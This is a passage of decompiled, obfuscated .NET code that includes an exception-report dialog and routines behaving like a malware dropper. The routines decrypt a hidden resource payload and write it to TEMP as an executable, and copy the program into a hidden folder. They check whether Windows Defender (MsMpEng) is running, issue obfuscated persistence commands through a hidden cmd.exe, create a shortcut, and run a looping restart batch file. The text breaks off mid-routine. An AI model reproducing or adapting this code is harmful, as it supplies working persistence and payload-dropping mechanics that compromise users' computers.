					((Control)form0_0.control2_0).set_Text("poweredBy1");
					((Control)form0_0.button_8).set_Anchor((AnchorStyles)10);
					((ButtonBase)form0_0.button_8).set_FlatStyle((FlatStyle)3);
					((Control)form0_0.button_8).set_Location(new Point(146, 197));
					((Control)form0_0.button_8).set_Name("saveReport");
					goto case 50;
				case 50:
					((Control)form0_0.button_8).set_Size(new Size(80, 24));
					((Control)form0_0.button_8).set_TabIndex(25);
					goto case 30;
				case 30:
					((Control)form0_0.button_8).set_Text("&Save Report");
					goto case 49;
				case 49:
					((Control)form0_0.button_8).set_Visible(false);
					((Control)form0_0.button_8).add_Click((EventHandler)form0_0.method_16);
					goto case 34;
				case 34:
					((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
					((Control)form0_0).set_BackColor(SystemColors.Window);
					((Form)form0_0).set_ClientSize(new Size(434, 768));
					((Form)form0_0).set_ControlBox(false);
					((Control)form0_0).get_Controls().Add((Control)(object)form0_0.control2_0);
					((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_2);
					((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_0);
					((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_1);
					((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
					((Control)form0_0).set_Name("ExceptionReportingForm");
					goto case 3;
				case 3:
					((Form)form0_0).set_ShowInTaskbar(false);
					((Form)form0_0).set_StartPosition((FormStartPosition)1);
					((Control)form0_0).set_Text("%AppName%");
					((Form)form0_0).set_TopMost(true);
					goto case 13;
				case 13:
					((Control)form0_0.panel_0).ResumeLayout(false);
					goto case 39;
				case 39:
					((Control)form0_0.panel_1).ResumeLayout(false);
					((Control)form0_0.panel_2).ResumeLayout(false);
					((Control)form0_0.panel_2).PerformLayout();
					((Control)form0_0).ResumeLayout(false);
					return;
				case 70:
					return;
				}
				break;
			}
			goto IL_0290;
			IL_0f42:
			((Control)form0_0.textBox_0).set_TabIndex(10);
			((Control)form0_0.textBox_0).add_TextChanged((EventHandler)form0_0.method_13);
			goto IL_0f66;
			IL_0f66:
			((Control)form0_0.control1_2).set_BackColor(Color.FromArgb(36, 96, 179));
			goto IL_0f7f;
			IL_0f7f:
			((Control)form0_0.control1_2).set_Dock((DockStyle)1);
			goto IL_0e27;
			IL_0e27:
			((Control)form0_0.control1_2).set_ForeColor(Color.White);
			form0_0.control1_2.IconState = Enum5.const_1;
			form0_0.control1_2.Image = null;
			((Control)form0_0.control1_2).set_Location(new Point(0, 0));
			((Control)form0_0.control1_2).set_Name("headerControl3");
			goto IL_0e71;
			IL_0e71:
			((Control)form0_0.control1_2).set_Size(new Size(413, 58));
			goto IL_0e88;
			IL_0e88:
			((Control)form0_0.control1_2).set_TabIndex(3);
			num = 26;
			if (!T1fpLDgQ4dlcokqoGbL())
			{
				goto IL_0290;
			}
			goto IL_1010;
			IL_0290:
			((Control)form0_0.button_0).set_TabIndex(6);
			((Control)form0_0.button_0).set_Text("&Don't Send");
			((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_1);
			((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
			goto IL_02d0;
			IL_02d0:
			((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
			((Control)form0_0.button_1).set_Location(new Point(214, 205));
			goto IL_02f6;
			IL_02f6:
			((Control)form0_0.button_1).set_Name("sendReport");
			((Control)form0_0.button_1).set_Size(new Size(105, 24));
			goto IL_031a;
			IL_031a:
			((Control)form0_0.button_1).set_TabIndex(9);
			((Control)form0_0.button_1).set_Text("&Send Error Report");
			((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_0);
			((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
			form0_0.label_1.set_FlatStyle((FlatStyle)3);
			((Control)form0_0.label_1).set_Location(new Point(20, 140));
			((Control)form0_0.label_1).set_Name("pleaseTellMessage");
			((Control)form0_0.label_1).set_Size(new Size(381, 55));
			((Control)form0_0.label_1).set_TabIndex(12);
			((Control)form0_0.label_1).set_Text("To help improve the software you use, %CompanyName% is interested in learning more about this error. We have created a report about the error for you to send to us.");
			((Control)form0_0.control1_0).set_BackColor(Color.FromArgb(36, 96, 179));
			((Control)form0_0.control1_0).set_Dock((DockStyle)1);
			goto IL_05eb;
			IL_05eb:
			((Control)form0_0.control1_0).set_ForeColor(Color.White);
			goto IL_03ec;
			IL_03ec:
			form0_0.control1_0.IconState = Enum5.const_1;
			form0_0.control1_0.Image = null;
			((Control)form0_0.control1_0).set_Location(new Point(0, 0));
			((Control)form0_0.control1_0).set_Name("headerControl1");
			((Control)form0_0.control1_0).set_Size(new Size(413, 58));
			goto IL_043d;
			IL_043d:
			((Control)form0_0.control1_0).set_TabIndex(3);
			((Control)form0_0.control1_0).set_TabStop(false);
			goto IL_0455;
			IL_0455:
			((Control)form0_0.control1_0).set_Text("%AppName% has encountered a problem.\nWe are sorry for the inconvenience.");
			((Control)form0_0.class54_0).set_Anchor((AnchorStyles)13);
			((Label)form0_0.class54_0).set_FlatStyle((FlatStyle)3);
			((Control)form0_0.class54_0).set_Location(new Point(20, 69));
			((Control)form0_0.class54_0).set_Name("errorMessage");
			goto IL_04a2;
			IL_04a2:
			((Control)form0_0.class54_0).set_Size(new Size(381, 13));
			((Control)form0_0.class54_0).set_TabIndex(10);
			((Control)form0_0.class54_0).set_Text("errorMessage");
			((Label)form0_0.class54_0).set_UseMnemonic(false);
			((Control)form0_0.button_7).set_Anchor((AnchorStyles)10);
			((ButtonBase)form0_0.button_7).set_FlatStyle((FlatStyle)3);
			((Control)form0_0.button_7).set_Location(new Point(136, 205));
			((Control)form0_0.button_7).set_Name("saveAsFile");
			goto IL_0525;
			IL_0525:
			((Control)form0_0.button_7).set_Size(new Size(72, 24));
			((Control)form0_0.button_7).set_TabIndex(11);
			((Control)form0_0.button_7).set_Text("Save as &File");
			((Control)form0_0.button_7).add_Click((EventHandler)form0_0.method_15);
			((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_8);
			((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_2);
			((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_3);
			goto IL_05af;
			IL_05af:
			((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_4);
			((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control3_0);
			num = 63;
			if (!T1fpLDgQ4dlcokqoGbL())
			{
				goto IL_05eb;
			}
			goto IL_1010;
		}
	}

	static void smethod_122(Exception exception_0, object[] object_0)
	{
		int methodID = -1;
		int ilOffset = -1;
		int num = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Length > 0)
					{
						num++;
					}
				}
			}
		}
		catch
		{
			num = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				methodID = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				ilOffset = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(methodID, object_0, ilOffset, num);
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains("SmartStackFrames"))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data["SmartStackFrames"] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data["SmartStackFrames"];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static void smethod_123(Class5.Class10 class10_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] array = default(byte[]);
		string text = default(string);
		object executablePath = default(object);
		string text3 = default(string);
		ResourceManager resourceManager = default(ResourceManager);
		string text4 = default(string);
		string text5 = default(string);
		byte[] array2 = default(byte[]);
		string sourceFileName = default(string);
		byte[] byte_ = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				bool flag;
				byte[] array3;
				string text6;
				bool flag2;
				string empty;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 776:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0057;
						case 6:
							goto IL_005d;
						case 7:
							goto IL_00c0;
						case 8:
						case 9:
							goto IL_00c6;
						case 10:
						case 11:
							goto IL_00ca;
						case 12:
							goto IL_00df;
						case 13:
							goto IL_00fe;
						case 14:
						case 15:
							goto IL_0112;
						case 16:
							goto IL_012c;
						case 17:
							goto IL_0132;
						case 18:
							goto IL_0143;
						case 20:
							goto IL_015c;
						case 19:
						case 21:
						case 22:
							goto IL_0160;
						case 23:
							goto IL_016b;
						case 24:
							goto IL_0199;
						case 25:
							goto IL_019f;
						case 26:
							goto IL_01a9;
						case 27:
							goto IL_01c2;
						case 28:
							goto IL_01d9;
						case 29:
							goto IL_01f0;
						case 30:
							goto IL_01f9;
						case 31:
							goto IL_020b;
						case 32:
							goto IL_0219;
						case 33:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 34:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0219:
					num = 32;
					Class21.smethod_76(new object[5]
					{
						string.Empty,
						array,
						false,
						false,
						text
					});
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002b;
					IL_002b:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0034;
					IL_0034:
					num = 4;
					text3 = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_0057;
					IL_0057:
					num = 5;
					flag = false;
					goto IL_005d;
					IL_005d:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual((object)(text3 + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + ""), Operators.ConcatenateObject(Operators.ConcatenateObject(executablePath, (object)""), (object)""), false))
					{
						goto IL_00c0;
					}
					goto IL_00c6;
					IL_00c0:
					num = 7;
					flag = true;
					goto IL_00c6;
					IL_00c6:
					num = 9;
					goto IL_00ca;
					IL_00ca:
					num = 11;
					resourceManager = new ResourceManager("您八认件去人", Assembly.GetExecutingAssembly());
					goto IL_00df;
					IL_00df:
					num = 12;
					text4 = "" + Interaction.Environ("TEMP") + "";
					goto IL_00fe;
					IL_00fe:
					num = 13;
					Class21.smethod_63(Class21.smethod_154("oAJ9Pm/REVvo5UjKLLNqMA=="));
					goto IL_0112;
					IL_0112:
					num = 15;
					text5 = Class21.smethod_154("qJ1rx6zo0JWv6cXezCyOGQ==") + ".exe";
					goto IL_012c;
					IL_012c:
					num = 16;
					array2 = array2;
					goto IL_0132;
					IL_0132:
					num = 17;
					array3 = Class21.smethod_35("fsfsdfsdfsdfsdf", array2);
					goto IL_0143;
					IL_0143:
					num = 18;
					if (!Operators.ConditionalCompareObjectEqual(executablePath, (object)(text3 + "#nsdffdsp#$$$.exe$$$"), false))
					{
						goto IL_015c;
					}
					goto IL_0160;
					IL_015c:
					num = 20;
					goto IL_0160;
					IL_0160:
					num = 22;
					text6 = "";
					goto IL_016b;
					IL_016b:
					num = 23;
					sourceFileName = Interaction.Environ(Class21.smethod_154("rRhnphBugUiRcVlpVgLfjw==")) + Class21.smethod_154("ijulUbn8DPPkee8Mdv0Pf3JPXTMNWvYRORO+JfoPSAU=") + Class21.smethod_154("8Ebrvyc8jIJpnps2eCCHYA==");
					goto IL_0199;
					IL_0199:
					num = 24;
					flag2 = false;
					goto IL_019f;
					IL_019f:
					num = 25;
					empty = string.Empty;
					goto IL_01a9;
					IL_01a9:
					num = 26;
					text = "" + text4 + "\\" + text5;
					goto IL_01c2;
					IL_01c2:
					num = 27;
					byte_ = (byte[])resourceManager.GetObject("么老么见千去");
					goto IL_01d9;
					IL_01d9:
					num = 28;
					array = Class21.smethod_35(Class21.smethod_154("axfXKc1uSPw22HSCJhAWEa6DjhDSpCiOMzx2Wd3rCNIeUVvr7X0cLx7c6+sI2SXe"), byte_);
					goto IL_01f0;
					IL_01f0:
					num = 29;
					Class21.smethod_132();
					goto IL_01f9;
					IL_01f9:
					num = 30;
					File.Delete(text3 + text5);
					goto IL_020b;
					IL_020b:
					num = 31;
					File.Copy(sourceFileName, text, overwrite: true);
					goto IL_0219;
					end_IL_0000_2:
					break;
				}
				num = 33;
				Thread.Sleep(10000);
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 776;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_124(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class21.smethod_122(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static void smethod_125(object object_0, Class46 class46_0, string string_0)
	{
		class46_0.dictionary_0.Add(string_0, object_0);
	}

	static void smethod_126()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 829:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0047;
						case 5:
							goto IL_0069;
						case 6:
							goto IL_0086;
						case 7:
							goto IL_0098;
						case 8:
							goto IL_00e4;
						case 9:
							goto IL_00ef;
						case 10:
							goto IL_0104;
						case 11:
							goto IL_0114;
						case 12:
							goto IL_0124;
						case 13:
							goto IL_0134;
						case 14:
							goto IL_0149;
						case 15:
							goto IL_0159;
						case 16:
							goto IL_016e;
						case 17:
							goto IL_017e;
						case 18:
							goto IL_018e;
						case 19:
							goto IL_019e;
						case 20:
							goto IL_01c1;
						case 21:
							goto IL_0217;
						case 22:
							goto IL_0227;
						case 23:
							goto IL_023c;
						case 24:
							goto IL_024c;
						case 25:
							goto IL_025c;
						case 26:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 27:
						case 28:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_025c:
					num = 25;
					streamWriter.Dispose();
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text2 = Interaction.Environ(Class21.smethod_154("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
					goto IL_0047;
					IL_0047:
					num = 4;
					text3 = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0069;
					IL_0069:
					num = 5;
					File.Delete(text + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\qJ1rx6zo0JWv6cXezCyOGQ==.bat");
					goto IL_0086;
					IL_0086:
					num = 6;
					if (Class21.smethod_63("cmd"))
					{
						goto end_IL_0000_3;
					}
					goto IL_0098;
					IL_0098:
					num = 7;
					streamWriter = new StreamWriter(text + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + ".bat");
					goto IL_00e4;
					IL_00e4:
					num = 8;
					streamWriter.AutoFlush = true;
					goto IL_00ef;
					IL_00ef:
					num = 9;
					streamWriter.Write(Class21.smethod_154("31RKsOSvI9/AFuhKog3NgA=="));
					goto IL_0104;
					IL_0104:
					num = 10;
					streamWriter.Write(Environment.NewLine);
					goto IL_0114;
					IL_0114:
					num = 11;
					streamWriter.Write("timeout /t @@");
					goto IL_0124;
					IL_0124:
					num = 12;
					streamWriter.Write(Environment.NewLine);
					goto IL_0134;
					IL_0134:
					num = 13;
					streamWriter.Write(Class21.smethod_154("sVCCMiKQCYeTpQSTFrz5DDm67Dq62ySggzNsI52ecP+zGW0ndTihzBH1ezwpAZMgAvZ0FwJEcI2azy08gnzpoj7dAR2hAZCAqGoM2t38QMc="));
					goto IL_0149;
					IL_0149:
					num = 14;
					streamWriter.Write(Environment.NewLine);
					goto IL_0159;
					IL_0159:
					num = 15;
					streamWriter.Write(Class21.smethod_154("OHLI5dgL1wwNBGr/QEZ9WA=="));
					goto IL_016e;
					IL_016e:
					num = 16;
					streamWriter.Write(Environment.NewLine);
					goto IL_017e;
					IL_017e:
					num = 17;
					streamWriter.Write(") || (");
					goto IL_018e;
					IL_018e:
					num = 18;
					streamWriter.Write(Environment.NewLine);
					goto IL_019e;
					IL_019e:
					num = 19;
					text4 = "%appdata%\\" + Class21.smethod_154("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==");
					goto IL_01c1;
					IL_01c1:
					num = 20;
					streamWriter.Write(" Start /W \"\" \"" + text + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + "\"");
					goto IL_0217;
					IL_0217:
					num = 21;
					streamWriter.Write(Environment.NewLine);
					goto IL_0227;
					IL_0227:
					num = 22;
					streamWriter.Write(Class21.smethod_154("OHLI5dgL1wwNBGr/QEZ9WA=="));
					goto IL_023c;
					IL_023c:
					num = 23;
					streamWriter.Write(Environment.NewLine);
					goto IL_024c;
					IL_024c:
					num = 24;
					streamWriter.Write(")");
					goto IL_025c;
					end_IL_0000_2:
					break;
				}
				num = 26;
				Interaction.Shell(text + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + ".bat", (AppWinStyle)0, false, -1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 829;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_127(string string_0, string string_1, EventArgs1 eventArgs1_0)
	{
		Class21.smethod_16(string_0, string_1, eventArgs1_0.class46_0);
	}

	static bool smethod_128(Class46 class46_0, string string_0)
	{
		try
		{
			byte[] byte_ = class46_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class21.smethod_46(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class21.smethod_110(byte_2, "<RSAKeyValue><Modulus>8zj1hbahsEExLXne+3IPQdSWhOiHb+myYDUdqqZ4y8RonhGwzfILRmwZuBUwmaXgb7LcqPATZ5Q3lkFVO2UFLTjEDIMNShisPhioAauMeI3sO9BXdzMcDj5+GP/6XYgD6yNVZY+xM834VBMvw1ONqPXQA0W466HmsKxP+38W7Qc=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes("{516600D7-3050-406A-87C1-F0EB057ED33B}");
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_129(Class32.Class42 class42_0)
	{
		if (class42_0.int_2 > 0)
		{
			class42_0.byte_0[class42_0.int_1++] = (byte)class42_0.uint_0;
			if (class42_0.int_2 > 8)
			{
				class42_0.byte_0[class42_0.int_1++] = (byte)(class42_0.uint_0 >> 8);
			}
		}
		class42_0.uint_0 = 0u;
		class42_0.int_2 = 0;
	}

	static void smethod_130(Class57 class57_0, IWebProxy iwebProxy_0)
	{
		class57_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_131(Class32.Class41 class41_0)
	{
		Array.Copy(class41_0.byte_0, 32768, class41_0.byte_0, 0, 32768);
		class41_0.int_1 -= 32768;
		class41_0.int_4 -= 32768;
		class41_0.int_3 -= 32768;
		for (int i = 0; i < 32768; i++)
		{
			int num = class41_0.short_0[i] & 0xFFFF;
			class41_0.short_0[i] = (short)((num >= 32768) ? (num - 32768) : 0);
		}
		for (int j = 0; j < 32768; j++)
		{
			int num2 = class41_0.short_1[j] & 0xFFFF;
			class41_0.short_1[j] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
		}
	}

	static void smethod_132()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		string text = default(string);
		object executablePath = default(object);
		StreamWriter standardInput = default(StreamWriter);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		object objectValue = default(object);
		object objectValue2 = default(object);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				string text10;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 2039:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0035;
						case 4:
							goto IL_0058;
						case 5:
							goto IL_0062;
						case 6:
							goto IL_0098;
						case 7:
							goto IL_00b2;
						case 8:
							goto IL_00cc;
						case 9:
							goto IL_00d5;
						case 10:
							goto IL_0139;
						case 11:
							goto IL_014e;
						case 12:
							goto IL_015f;
						case 13:
							goto IL_0170;
						case 14:
							goto IL_0181;
						case 15:
							goto IL_0192;
						case 16:
							goto IL_01a3;
						case 17:
							goto IL_01af;
						case 18:
							goto IL_01bb;
						case 19:
							goto IL_01c5;
						case 20:
							goto IL_01d0;
						case 21:
							goto IL_01db;
						case 22:
							goto IL_01e6;
						case 23:
							goto IL_01f1;
						case 24:
							goto IL_0270;
						case 25:
							goto IL_0280;
						case 26:
							goto IL_02e4;
						case 28:
							goto IL_02f7;
						case 29:
							goto IL_02fb;
						case 30:
							goto IL_0365;
						case 31:
							goto IL_0370;
						case 32:
							goto IL_0382;
						case 33:
							goto IL_039c;
						case 34:
							goto IL_03bd;
						case 35:
							goto IL_0426;
						case 36:
							goto IL_048a;
						case 37:
							goto IL_04ee;
						case 38:
							goto IL_0515;
						case 39:
							goto IL_0531;
						case 40:
							goto IL_054d;
						case 27:
						case 41:
						case 42:
							goto IL_05b6;
						case 43:
							goto IL_060f;
						case 44:
							goto IL_0672;
						case 45:
						case 46:
							goto IL_06df;
						case 47:
							goto IL_06f8;
						case 48:
							goto IL_0703;
						case 49:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 50:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0703:
					num = 48;
					process.Kill();
					break;
					IL_0008:
					num = 2;
					text = "" + Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_0035;
					IL_0035:
					num = 3;
					text2 = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0058;
					IL_0058:
					num = 4;
					process = new Process();
					goto IL_0062;
					IL_0062:
					num = 5;
					text3 = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=") + Class21.smethod_154("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==");
					goto IL_0098;
					IL_0098:
					num = 6;
					Directory.CreateDirectory(text + Class21.smethod_154("fEzc44351CMchjFeeY23eA=="));
					goto IL_00b2;
					IL_00b2:
					num = 7;
					File.SetAttributes(text + Class21.smethod_154("fEzc44351CMchjFeeY23eA=="), FileAttributes.Hidden);
					goto IL_00cc;
					IL_00cc:
					num = 8;
					executablePath = Application.get_ExecutablePath();
					goto IL_00d5;
					IL_00d5:
					num = 9;
					text4 = "" + Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==");
					goto IL_0139;
					IL_0139:
					num = 10;
					process.StartInfo.FileName = "cmd.exe";
					goto IL_014e;
					IL_014e:
					num = 11;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_015f;
					IL_015f:
					num = 12;
					process.StartInfo.RedirectStandardInput = true;
					goto IL_0170;
					IL_0170:
					num = 13;
					process.StartInfo.UseShellExecute = false;
					goto IL_0181;
					IL_0181:
					num = 14;
					process.StartInfo.CreateNoWindow = true;
					goto IL_0192;
					IL_0192:
					num = 15;
					process.StartInfo.RedirectStandardError = true;
					goto IL_01a3;
					IL_01a3:
					num = 16;
					process.Start();
					goto IL_01af;
					IL_01af:
					num = 17;
					standardInput = process.StandardInput;
					goto IL_01bb;
					IL_01bb:
					num = 18;
					text5 = "cop";
					goto IL_01c5;
					IL_01c5:
					num = 19;
					text6 = "y ";
					goto IL_01d0;
					IL_01d0:
					num = 20;
					standardInput.AutoFlush = true;
					goto IL_01db;
					IL_01db:
					num = 21;
					text7 = "%temp%\\";
					goto IL_01e6;
					IL_01e6:
					num = 22;
					text8 = ".lnk";
					goto IL_01f1;
					IL_01f1:
					num = 23;
					standardInput.Write(text5 + text6 + "\"" + Application.get_ExecutablePath() + "\" \"" + text7 + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + "\" /Y" + Environment.NewLine);
					goto IL_0270;
					IL_0270:
					num = 24;
					if (Class21.smethod_63("MsMpEng"))
					{
						goto IL_0280;
					}
					goto IL_02f7;
					IL_0280:
					num = 25;
					standardInput.Write(Class21.smethod_154("04gH48xsNOUf+H7cCLcQbtVo+n2CPnhoK4m4jmlO9kUKlPfgFZIYHte5sEFXVfO17fYxlnA2aVC5aaTAAEGBlnIXKfM49/5SbjLev7dUVnTkJKF7YnQ/Aj9mLKSIhAHV") + text7 + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + "\" /f" + Environment.NewLine);
					goto IL_02e4;
					IL_02e4:
					num = 26;
					Thread.Sleep(7000);
					goto IL_05b6;
					IL_02f7:
					num = 28;
					goto IL_02fb;
					IL_02fb:
					num = 29;
					standardInput.Write(Class21.smethod_154("04gH48xsNOUf+H7cCLcQbtVo+n2CPnhoK4m4jmlO9kUKlPfgFZIYHte5sEFXVfO17fYxlnA2aVC5aaTAAEGBlnIXKfM49/5SbjLev7dUVnTkJKF7YnQ/Aj9mLKSIhAHV") + text7 + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + text8 + "\" /f" + Environment.NewLine);
					goto IL_0365;
					IL_0365:
					num = 30;
					text9 = "WScrip";
					goto IL_0370;
					IL_0370:
					num = 31;
					text10 = text9 + "t.Shell";
					goto IL_0382;
					IL_0382:
					num = 32;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("", ""));
					goto IL_039c;
					IL_039c:
					num = 33;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(text9 + "t.Shell", ""));
					goto IL_03bd;
					IL_03bd:
					num = 34;
					objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { text + Class21.smethod_154("fEzc44351CMchjFeeY23eA==") + "\\" + Class21.smethod_154("RcPeAUZ2tSiP21uqWifHZQ==") + text8 }, (string[])null, (Type[])null, (bool[])null));
					goto IL_0426;
					IL_0426:
					num = 35;
